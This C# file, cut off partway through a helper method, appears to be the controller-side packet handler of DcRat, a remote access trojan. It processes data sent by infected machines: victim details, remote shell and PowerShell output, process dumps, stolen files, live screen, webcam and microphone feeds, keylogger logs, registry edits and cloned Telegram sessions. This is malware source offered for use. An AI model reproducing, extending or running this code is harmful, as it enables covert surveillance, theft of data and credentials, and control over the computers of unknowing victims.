using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;
using DcRat.helpForms;
using DcRat.Properties;
using DcRat.singleForms;
using DcRat.TCPSocket;
using MessagePack;
using Microsoft.Win32;
using static DcRat.Helper.Helper;
using static DcRat.Helper.RegistrySeeker;

namespace DcRat.HandlePacket
{
    class Packet
    {
        public static async void Read(object data)
        {
            try
            {
                Thread.Sleep(0);
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Aes.Decrypt((byte[])data));
                string temp = unpack_msgpack.ForcePathObject("Packet").AsString;
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "ClientInfo":
                        {
                            Clients client = new Clients
                            {
                                Info =
                                {
                                    HWID = unpack_msgpack.ForcePathObject("HWID").AsString,
                                    User = unpack_msgpack.ForcePathObject("User").AsString,
                                    OS = unpack_msgpack.ForcePathObject("OS").AsString,
                                    Camera = unpack_msgpack.ForcePathObject("Camera").AsString,
                                    InstallTime = unpack_msgpack.ForcePathObject("Install-Time").AsString,
                                    Path = unpack_msgpack.ForcePathObject("Path").AsString,
                                    Version = unpack_msgpack.ForcePathObject("Version").AsString,
                                    Permission = unpack_msgpack.ForcePathObject("Admin").AsString,
                                    AV = unpack_msgpack.ForcePathObject("AV").AsString,
                                    Group = unpack_msgpack.ForcePathObject("Group").AsString,
                                    Active = unpack_msgpack.ForcePathObject("Active").AsString,
                                    IP = unpack_msgpack.ForcePathObject("IP").AsString
                                }
                            };

                            client.LV = new ListViewItem
                            {
                                Tag = client,
                                Text = client.Info.IP,
                                ToolTipText = client.Info.Path
                            };
                            client.LV.SubItems.Add(Map_ip(client.Info.IP));
                            XDocument myDoc = XDocument.Load(Path.Combine(Application.StartupPath, "Clients Folder", "Note.xml"));

                            IEnumerable<XElement> products = from c in myDoc.Descendants("Client") where c.FirstAttribute.Value == unpack_msgpack.ForcePathObject("HWID").AsString select c;
                            if (products.Count() > 0)
                            {
                                XElement product = products.First();
                                client.LV.SubItems.Add(product.Element("Note").Value+"-"+unpack_msgpack.ForcePathObject("Group").AsString);
                            }
                            else
                            {
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                            }
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                            if (unpack_msgpack.ForcePathObject("User").AsString.ToLower() == "system")
                            {
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                            }
                            else
                            {
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString+"/"+unpack_msgpack.ForcePathObject("Admin").AsString);
                            }
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Camera").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Install-Time").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("AV").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Active").AsString);

                            

                            FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                            {
                                lock (Setting.LockListviewClients)
                                {
                                    FormMain.childForm_Home.listViewHome.Items.Add(client.LV);
                                    FormMain.childForm_Home.listViewHome.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                                    FormMain.childForm_Home.AppandLog( unpack_msgpack.ForcePathObject("HWID").AsString + ": Client connected !");
                                }
                            }));
                            break;
                        }

                    case "ClientPing":
                        {
                            FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                            {
                                lock (Setting.LockListviewClients)
                                {
                                    foreach (ListViewItem item in FormMain.childForm_Home.listViewHome.Items)
                                    {
                                        if (item.SubItems[3].Text == unpack_msgpack.ForcePathObject("HWID").AsString)
                                        {
                                            item.SubItems[9].Text = unpack_msgpack.ForcePathObject("Message").AsString;
                                        }
                                    }
                                }
                            }));
                        }
                        break;

                    case "ClientClose":
                        {
                            FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                            {
                                lock (Setting.LockListviewClients)
                                {
                                    foreach (ListViewItem item in FormMain.childForm_Home.listViewHome.Items)
                                    {
                                        if (item.SubItems[3].Text == unpack_msgpack.ForcePathObject("HWID").AsString)
                                        {
                                            if (FormMain.childForm_Home.listViewHome.Tag== item)
                                            {
                                                FormMain.childForm_Home.listViewHome.Tag = null;
                                            }
                                            item.Remove();
                                        }
                                    }
                                }
                                FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Client disconnected !");
                            }));
                        }
                        break;

                    case "shell":
                        {
                            singleFormCmd shell = (singleFormCmd)Application.OpenForms["shell:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (shell != null)
                            {
                                lock (shell.LockrichTextBox)
                                {
                                    shell.Invoke(new ThreadStart(delegate {
                                        shell.richTextBox.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
                                        shell.richTextBox.SelectionStart = shell.richTextBox.TextLength;
                                        shell.richTextBox.ScrollToCaret();
                                        Thread.Sleep(10);
                                    }));
                                }
                                
                                if (string.IsNullOrEmpty(shell.richTextBox.Text))
                                {
                                    FormMain.childForm_Home.AppandLog( unpack_msgpack.ForcePathObject("HWID").AsString + ": Remote Shell Opened !" );
                                }
                            }
                        }
                        break;

                    case "powershell":
                        {
                            singleFormPowershell shell = (singleFormPowershell)Application.OpenForms["powershell:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (shell != null)
                            {
                                if (string.IsNullOrEmpty(unpack_msgpack.ForcePathObject("ReadInput").AsString)) return;
                                lock (shell.LockrichTextBox)
                                {
                                    shell.Invoke(new ThreadStart(delegate {
                                        shell.richTextBox.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
                                        shell.richTextBox.SelectionStart = shell.richTextBox.TextLength;
                                        shell.richTextBox.ScrollToCaret();
                                        Thread.Sleep(10);
                                    }));
                                }

                                Debug.WriteLine(unpack_msgpack.ForcePathObject("ReadInput").AsString);
                                if (shell.richTextBox.Text!="")
                                {
                                    FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Remote Powershell Opened !" );
                                }
                            }
                        }
                        break;

                    case "process":
                        {
                            singleFormProcess process = (singleFormProcess)Application.OpenForms["process:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (process != null)
                            {
                                if (process.listViewprocess.Items.Count == 0)
                                {
                                    FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Process List obtained !");
                                }
                                process.Invoke((MethodInvoker)(() =>
                                {
                                    process.listViewprocess.Items.Clear();
                                    process.imageList.Images.Clear();
                                    string processLists = unpack_msgpack.ForcePathObject("Message").AsString;
                                    string[] _NextProc = processLists.Split(new[] { "-=>" }, StringSplitOptions.None);
                                    for (int i = 0; i < _NextProc.Length; i++)
                                    {
                                        if (_NextProc[i].Length > 0)
                                        {
                                            ListViewItem lv = new ListViewItem
                                            {
                                                Text = Path.GetFileName(_NextProc[i + 2])
                                            };
                                            lv.SubItems.Add(_NextProc[i + 1]);
                                            lv.SubItems.Add(_NextProc[i + 4]);
                                            lv.SubItems.Add(_NextProc[i + 12]);//bit
                                            lv.SubItems.Add(_NextProc[i + 13]);//owner
                                            lv.SubItems.Add(_NextProc[i + 14]);//clr
                                            lv.SubItems.Add(_NextProc[i + 5]);
                                            lv.SubItems.Add((long.Parse(_NextProc[i + 6]) / 1000) + " KB");
                                            lv.SubItems.Add((long.Parse(_NextProc[i + 7]) / 1000) + " KB");
                                            lv.SubItems.Add(_NextProc[i + 8]);
                                            lv.SubItems.Add(_NextProc[i + 9]);
                                            lv.SubItems.Add(_NextProc[i + 10]);
                                            lv.SubItems.Add(_NextProc[i + 11]);

                                            lv.ToolTipText = "Path:" + Environment.NewLine + _NextProc[i] + Environment.NewLine + "Command Line:" + Environment.NewLine + _NextProc[i + 3];
                                            Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_NextProc[i + 15])));
                                            process.imageList.Images.Add(_NextProc[i + 1], im);
                                            lv.ImageKey = _NextProc[i + 1];
                                            process.listViewprocess.Items.Add(lv);
                                        }
                                        i += 15;
                                    }
                                }));
                            }
                        }
                        break;

                    case "processDump":
                        {
                            string fullPath = Path.Combine(Application.StartupPath, "Clients Folder", unpack_msgpack.ForcePathObject("HWID").AsString, "Process Dump");
                            if (!Directory.Exists(fullPath))
                            {
                                Directory.CreateDirectory(fullPath);
                            }

                            File.WriteAllBytes(fullPath + "\\" + unpack_msgpack.ForcePathObject("Name").AsString + ".dmp", unpack_msgpack.ForcePathObject("Message").GetAsBytes());

                            FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Process " + unpack_msgpack.ForcePathObject("Name").AsString + " Dumped !");
                        }
                        break;

                    case "getDrivers":
                        {
                            singleFormFile FM = (singleFormFile)Application.OpenForms["file:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (FM != null)
                            {
                                if (FM.listViewfile.Items.Count==0)
                                {
                                    FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Remote File Manager Opened !");
                                }
                                FM.toolStripTextBoxaddress.Text = "";
                                FM.listViewfile.Items.Clear();
                                string[] driver = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                for (int i = 0; i < driver.Length; i++)
                                {
                                    if (driver[i].Length > 0)
                                    {
                                        ListViewItem lv = new ListViewItem
                                        {
                                            Text = driver[i],
                                            ToolTipText = driver[i]
                                        };
                                        FM.imageList.Images.Clear();
                                        FM.imageList.Images.Add("0_folder", Resources.folder);
                                        FM.imageList.Images.Add("1_HDD", Resources.HDD);
                                        FM.imageList.Images.Add("2_USB", Resources.USB);

                                        FM.imageListlarge.Images.Clear();
                                        FM.imageListlarge.Images.Add("0_folder", Resources.folder);
                                        FM.imageListlarge.Images.Add("1_HDD", Resources.HDD);
                                        FM.imageListlarge.Images.Add("2_USB", Resources.USB);
                                        if (driver[i + 1] == "Fixed")
                                        {
                                            lv.ImageIndex = 1;
                                        }
                                        else if (driver[i + 1] == "Removable")
                                        {
                                            lv.ImageIndex = 2;
                                        }
                                        else
                                        {
                                            lv.ImageIndex = 1;
                                        }

                                        FM.listViewfile.Items.Add(lv);
                                    }
                                    i += 1;
                                }
                            }
                            break;
                        }

                    case "getPath":
                        {
                            singleFormFile FM = (singleFormFile)Application.OpenForms["file:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (FM != null)
                            {
                                FM.toolStripTextBoxaddress.Text = unpack_msgpack.ForcePathObject("CurrentPath").AsString;
                                if (FM.toolStripTextBoxaddress.Text.EndsWith("\\"))
                                {
                                    FM.toolStripTextBoxaddress.Text = FM.toolStripTextBoxaddress.Text.Substring(0, FM.toolStripTextBoxaddress.Text.Length - 1);
                                }
                                if (FM.toolStripTextBoxaddress.Text.Length == 2)
                                {
                                    FM.toolStripTextBoxaddress.Text = FM.toolStripTextBoxaddress.Text + "\\";
                                }

                                FM.listViewfile.BeginUpdate();
                                //
                                FM.listViewfile.Items.Clear();
                                FM.imageList.Images.Clear();
                                FM.imageList.Images.Add("0_folder", Resources.folder);
                                FM.imageListlarge.Images.Clear();
                                FM.imageListlarge.Images.Add("0_folder", Resources.folder);
                                FM.listViewfile.Groups.Clear();
                                FM.toolStripLabelalert.Text = "";

                                ListViewGroup groupFolder = new ListViewGroup("Folders");
                                ListViewGroup groupFile = new ListViewGroup("Files");

                                FM.listViewfile.Groups.Add(groupFolder);
                                FM.listViewfile.Groups.Add(groupFile);

                                FM.listViewfile.Items.AddRange(await Task.Run(() => GetFolders(unpack_msgpack, groupFolder).ToArray()));
                                FM.listViewfile.Items.AddRange(await Task.Run(() => GetFiles(unpack_msgpack, groupFile, FM.imageList, FM.imageListlarge).ToArray()));
                                //
                                FM.listViewfile.Enabled = true;
                                FM.listViewfile.Focus();
                                FM.listViewfile.EndUpdate();

                                FM.toolStripLabelcount.Text = $"Folder[{FM.listViewfile.Groups[0].Items.Count}]   Files[{FM.listViewfile.Groups[1].Items.Count}]";
                            }
                            break;
                        }

                    case "fileError":
                        {
                            singleFormFile FM = (singleFormFile)Application.OpenForms["file:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (FM != null)
                            {
                                FM.toolStripLabelalert.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                                FM.listViewfile.Enabled = true;
                            }
                            break;
                        }

                    case "fileDownload":
                        {
                            string extension;
                            if (FormMain.childForm_Home.InvokeRequired)
                            {
                                FormMain.childForm_Home.BeginInvoke((MethodInvoker)(() =>
                                {
                                    string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "Clients Folder\\" + unpack_msgpack.ForcePathObject("HWID").AsString)))
                                    {
                                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Clients Folder\\" + unpack_msgpack.ForcePathObject("HWID").AsString));
                                    }

                                    string filename = Path.Combine(Application.StartupPath, "Clients Folder\\" + unpack_msgpack.ForcePathObject("HWID").AsString + "\\" + unpack_msgpack.ForcePathObject("Name").AsString);
                                    if (File.Exists(filename))
                                    {
                                        extension = Path.GetExtension(filename);
                                        filename = filename.Substring(0, filename.Length - extension.Length) + "_" + DateTime.Now.ToString("yyyy-MM-dd--HH:mm:ss") + extension;
                                    }
                                    File.WriteAllBytes(filename, unpack_msgpack.ForcePathObject("File").GetAsBytes());
                                    FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": File "+ Path.GetFileName(filename) + " downloaded !" );
                                }));
                            }
                            break;
                        }

                    case "remoteDesktop":
                        {
                            singleFormScreen RD = (singleFormScreen)Application.OpenForms["desktop:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (RD != null)
                            {
                                byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                Bitmap decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream));
                                if (!RD.init)
                                {
                                    lock (RD.syncPicbox)
                                    {
                                        RD.rdSize = decoded0.Size;
                                        int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
                                        RD.toolStripComboBoxswitch.Items.Clear();
                                        for (int i = 0; i < Screens; i++)
                                        {
                                            RD.toolStripComboBoxswitch.Items.Add(i);
                                        }
                                        RD.init = true;
                                    }
                                    FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Remote Desktop Opened !");
                                }
                                lock (RD.syncPicbox)
                                {
                                    RD.GetImage = decoded0;
                                    RD.rdSize = decoded0.Size;
                                    RD.pictureBoxscreen.Image = RD.GetImage;
                                    RD.FPS++;
                                    if (RD.sw.ElapsedMilliseconds >= 1000)
                                    {
                                        RD.Text = "RemoteDesktop:" + unpack_msgpack.ForcePathObject("HWID").AsString + "    FPS:" + RD.FPS + "    Screen:" + RD.GetImage.Width + " x " + RD.GetImage.Height + "    Size:" + BytesToString(RdpStream.Length);
                                        RD.FPS = 0;
                                        RD.sw = Stopwatch.StartNew();
                                    }
                                }
                            }
                            break;
                        }

                    case "getWebcams":
                        {
                            singleFormCamera singleFormCamera = (singleFormCamera)Application.OpenForms["webcam:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormCamera != null)
                            {
                                foreach (string camDriver in unpack_msgpack.ForcePathObject("List").AsString.Split(new[] { "-=>" }, StringSplitOptions.None))
                                {
                                    if (!string.IsNullOrWhiteSpace(camDriver))
                                    {
                                        singleFormCamera.toolStripComboBoxswitch.Items.Add(camDriver);
                                    }
                                }
                                singleFormCamera.toolStripComboBoxswitch.SelectedIndex = 0;
                                if (singleFormCamera.toolStripComboBoxswitch.Text == "None")
                                {
                                    singleFormCamera.toolStripButtonstartcam.Enabled = false;
                                }
                                FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Remote Webcam Opened !");
                            }
                            break;
                        }

                    case "webcam":
                        {
                            singleFormCamera singleFormCamera = (singleFormCamera)Application.OpenForms["webcam:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormCamera != null)
                            {
                                singleFormCamera.BeginInvoke((MethodInvoker)(() =>
                                {
                                    using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                                    {
                                        singleFormCamera.GetImage = (Image)Image.FromStream(memoryStream).Clone();
                                        singleFormCamera.pictureBoxcamera.Image = singleFormCamera.GetImage;
                                        singleFormCamera.FPS++;
                                        if (singleFormCamera.sw.ElapsedMilliseconds >= 1000)
                                        {
                                            if (singleFormCamera.SaveIt)
                                            {
                                                string FullPath = Path.Combine(Application.StartupPath, "Clients Folder", unpack_msgpack.ForcePathObject("HWID").AsString, "WebCam");
                                                if (!Directory.Exists(FullPath))
                                                {
                                                    Directory.CreateDirectory(FullPath);
                                                }

                                                singleFormCamera.pictureBoxcamera.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss")}.jpeg", ImageFormat.Jpeg);
                                            }
                                            singleFormCamera.Text = "Webcam:" + unpack_msgpack.ForcePathObject("HWID").AsString + "    FPS:" + singleFormCamera.FPS + "    Screen:" + singleFormCamera.GetImage.Width + " x " + singleFormCamera.GetImage.Height + "    Size:" + BytesToString(memoryStream.Length);
                                            singleFormCamera.FPS = 0;
                                            singleFormCamera.sw = Stopwatch.StartNew();
                                        }
                                    }
                                }));
                            }
                            break;
                        }

                    case "network":
                        {
                            singleFormNetwork singleFormNetwork = (singleFormNetwork)Application.OpenForms["network:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormNetwork != null)
                            {
                                FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Netstat Obtained !");
                                singleFormNetwork.listViewnetwork.Items.Clear();
                                string processLists = unpack_msgpack.ForcePathObject("Message").AsString;
                                string[] _NextProc = processLists.Split(new[] { "-=>" }, StringSplitOptions.None);
                                for (int i = 0; i < _NextProc.Length; i++)
                                {
                                    if (_NextProc[i+1].Length > 0)
                                    {
                                        ListViewItem lv = new ListViewItem
                                        {
                                            Text = Path.GetFileName(_NextProc[i])
                                        };
                                        lv.SubItems.Add(_NextProc[i + 1]);
                                        lv.SubItems.Add(_NextProc[i + 2]);
                                        lv.SubItems.Add(_NextProc[i + 3]);
                                        lv.SubItems.Add(_NextProc[i + 4]);
                                        lv.SubItems.Add(_NextProc[i + 5]);
                                        lv.ToolTipText = _NextProc[i + 1];
                                        singleFormNetwork.listViewnetwork.Items.Add(lv);
                                    }
                                    i += 5;
                                }
                            }
                            break;
                        }

                    case "device":
                        {
                            singleFormDevice formDevice = (singleFormDevice)Application.OpenForms["device:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (formDevice != null)
                            {
                                formDevice.Invoke((MethodInvoker)(() =>
                                {
                                    formDevice.listViewDevice.Items.Clear();
                                    formDevice.listViewDevice.Groups.Clear();
                                    GetAllDevices(unpack_msgpack.ForcePathObject("Message").AsString, formDevice.listViewDevice);
                                }));
                                FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Device List Obtained !");
                            }
                            break;
                        }

                    case "CreateKey":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                                    byte[] Matchbyte = unpack_msgpack.ForcePathObject("Match").GetAsBytes();
                                    singleFormRegistry.CreateNewKey(ParentPath, DeSerializeMatch(Matchbyte));
                                }));
                            }
                            break;
                        }

                    case "LoadKey":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string rootKey = unpack_msgpack.ForcePathObject("RootKey").AsString;
                                    byte[] Matchesbyte = unpack_msgpack.ForcePathObject("Matches").GetAsBytes();
                                    singleFormRegistry.AddKeys(rootKey, DeSerializeMatches(Matchesbyte));
                                }));
                                if (string.IsNullOrEmpty(unpack_msgpack.ForcePathObject("RootKey").AsString))
                                {
                                    FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Remote Registry opened !");
                                }
                            }
                            break;
                        }

                    case "DeleteKey":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string rootKey = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                                    string subkey = unpack_msgpack.ForcePathObject("KeyName").AsString;
                                    singleFormRegistry.DeleteKey(rootKey, subkey);
                                }));
                            }
                            break;
                        }

                    case "RenameKey":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string rootKey = unpack_msgpack.ForcePathObject("rootKey").AsString;
                                    string oldName = unpack_msgpack.ForcePathObject("oldName").AsString;
                                    string newName = unpack_msgpack.ForcePathObject("newName").AsString;
                                    singleFormRegistry.RenameKey(rootKey, oldName, newName);
                                }));
                            }
                            break;
                        }

                    case "CreateValue":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                    string Kindstring = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                                    string newKeyName = unpack_msgpack.ForcePathObject("newKeyName").AsString;
                                    RegistryValueKind Kind = RegistryValueKind.None;
                                    switch (Kindstring)
                                    {
                                        case "-1":
                                            {
                                                Kind = RegistryValueKind.None;
                                                break;
                                            }
                                        case "0":
                                            {
                                                Kind = RegistryValueKind.Unknown;
                                                break;
                                            }
                                        case "1":
                                            {
                                                Kind = RegistryValueKind.String;
                                                break;
                                            }
                                        case "2":
                                            {
                                                Kind = RegistryValueKind.ExpandString;
                                                break;
                                            }
                                        case "3":
                                            {
                                                Kind = RegistryValueKind.Binary;
                                                break;
                                            }
                                        case "4":
                                            {
                                                Kind = RegistryValueKind.DWord;
                                                break;
                                            }
                                        case "7":
                                            {
                                                Kind = RegistryValueKind.MultiString;
                                                break;
                                            }
                                        case "11":
                                            {
                                                Kind = RegistryValueKind.QWord;
                                                break;
                                            }
                                    }
                                    RegValueData regValueData = new RegValueData
                                    {
                                        Name = newKeyName,
                                        Kind = Kind,
                                        Data = new byte[] { }
                                    };

                                    singleFormRegistry.CreateValue(keyPath, regValueData);
                                }));

                            }
                            break;
                        }

                    case "DeleteValue":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                    string ValueName = unpack_msgpack.ForcePathObject("ValueName").AsString;

                                    singleFormRegistry.DeleteValue(keyPath, ValueName);
                                }));

                            }
                            break;
                        }

                    case "RenameValue":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                    string OldValueName = unpack_msgpack.ForcePathObject("OldValueName").AsString;
                                    string NewValueName = unpack_msgpack.ForcePathObject("NewValueName").AsString;

                                    singleFormRegistry.RenameValue(keyPath, OldValueName, NewValueName);
                                }));

                            }
                            break;
                        }
                    case "ChangeValue":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                    byte[] RegValueDatabyte = unpack_msgpack.ForcePathObject("Value").GetAsBytes();

                                    singleFormRegistry.ChangeValue(keyPath, DeSerializeRegValueData(RegValueDatabyte));
                                }));

                            }
                            break;
                        }

                    case "voice":
                        {                            
                            singleFormVoice formVoice = (singleFormVoice)Application.OpenForms["voice:" + unpack_msgpack.ForcePathObject("HWID").AsString];                            
                            if (formVoice != null&& formVoice._isRun)
                            {
                                try
                                {
                                    byte[] br = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                    formVoice._player.PlayData(br);
                                }
                                catch { }
                            }
                            break;
                        }

                    case "keyLogger":
                        {
                            singleFormKeyLogger formKeyLogger = (singleFormKeyLogger)Application.OpenForms["keylogger:" + unpack_msgpack.ForcePathObject("HWID").AsString];
                            if (formKeyLogger != null)
                            {
                                formKeyLogger.Sb.Append(unpack_msgpack.ForcePathObject("log").GetAsString());
                                formKeyLogger.richTextBox.Text = formKeyLogger.Sb.ToString();
                                formKeyLogger.richTextBox.SelectionStart = formKeyLogger.richTextBox.TextLength;
                                formKeyLogger.richTextBox.ScrollToCaret();
                            }
                            break;
                        }

                    case "thumbnail":
                        {
                            FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                            {
                                using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                                {
                                    lock (Setting.LockListviewClients)
                                    {
                                        try
                                        {
                                            FormMain.childForm_Home.imageListicon.Images.RemoveByKey(unpack_msgpack.ForcePathObject("HWID").AsString);
                                        }
                                        catch { }
                                        FormMain.childForm_Home.imageListicon.Images.Add(unpack_msgpack.ForcePathObject("HWID").AsString, Bitmap.FromStream(memoryStream));
                                        foreach (ListViewItem item in FormMain.childForm_Home.listViewHome.Items)
                                        {
                                            if (item.SubItems[3].Text == unpack_msgpack.ForcePathObject("HWID").AsString)
                                            {
                                                item.ImageKey = unpack_msgpack.ForcePathObject("HWID").AsString;
                                            }
                                        }
                                    }
                                }
                            }));
                        }
                        break;

                    case "Message":
                        {
                            string FullPath = Path.Combine(Application.StartupPath, "Clients Folder", unpack_msgpack.ForcePathObject("HWID").AsString, "Message");
                            if (!Directory.Exists(FullPath))
                            {
                                Directory.CreateDirectory(FullPath);
                            }
                            string path = FullPath + $"\\Message_{DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss")}.txt";
                            File.WriteAllText(path, unpack_msgpack.ForcePathObject("Message").AsString);
                            //Process.Start(path);
                            FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                            {
                                helperFormMessage message = new helperFormMessage();

                                message.richTextBox.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                                message.Show();
                            }));
                            break;
                        }

                    case "Tasks":
                        {
                            if (!FormMain.childFormTasks_on) break;
                            FormMain.childForm_Tasks.listViewtasks.Items.Clear();
                            string Lists = unpack_msgpack.ForcePathObject("Message").AsString;
                            string[] _NextProc = Lists.Split(new[] { "-=>" }, StringSplitOptions.None);
                            for (int i = 0; i < _NextProc.Length; i++)
                            {
                                if (_NextProc[i].Length > 0)
                                {
                                    ListViewItem lv = new ListViewItem
                                    {
                                        Text = _NextProc[i]
                                    };
                                    lv.SubItems.Add((Convert.ToBoolean(_NextProc[i + 1])?"ON":"OFF"));
                                    lv.SubItems.Add(_NextProc[i + 2]);
                                                                        
                                    FormMain.childForm_Tasks.listViewtasks.Items.Add(lv);
                                }
                                i += 2;
                            }
                            break;
                        }

                    case "Log":
                        {
                            FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ":" + unpack_msgpack.ForcePathObject("Message").AsString);
                            break;
                        }

                    case "telegram":
                        {
                            string FullPath = Path.Combine(Application.StartupPath, "Clients Folder", unpack_msgpack.ForcePathObject("HWID").AsString, "Telegram");
                            if (!Directory.Exists(FullPath))
                            {
                                Directory.CreateDirectory(FullPath);
                            }
                            string path = FullPath + $"\\Telegram_{DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss")}.zip";
                            File.WriteAllBytes(path, Convert.FromBase64String(unpack_msgpack.ForcePathObject("Message").AsString));

                            FormMain.childForm_Home.AppandLog(unpack_msgpack.ForcePathObject("HWID").AsString + ": Telegram cloned !");
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        private static List<ListViewItem> GetFolders(MsgPack unpack_msgpack, ListViewGroup listViewGroup)
        {
            string[] _folder = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
            List<ListViewItem> lists = new List<ListViewItem>();
            int numFolders = 0;
            for (int i = 0; i < _folder.Length; i++)
            {
                if (_folder[i].Length > 0)
                {
                    ListViewItem lv = new ListViewItem
                    {
                        Text = _folder[i]
                    };
                    lv.SubItems.Add(_folder[i + 2]);
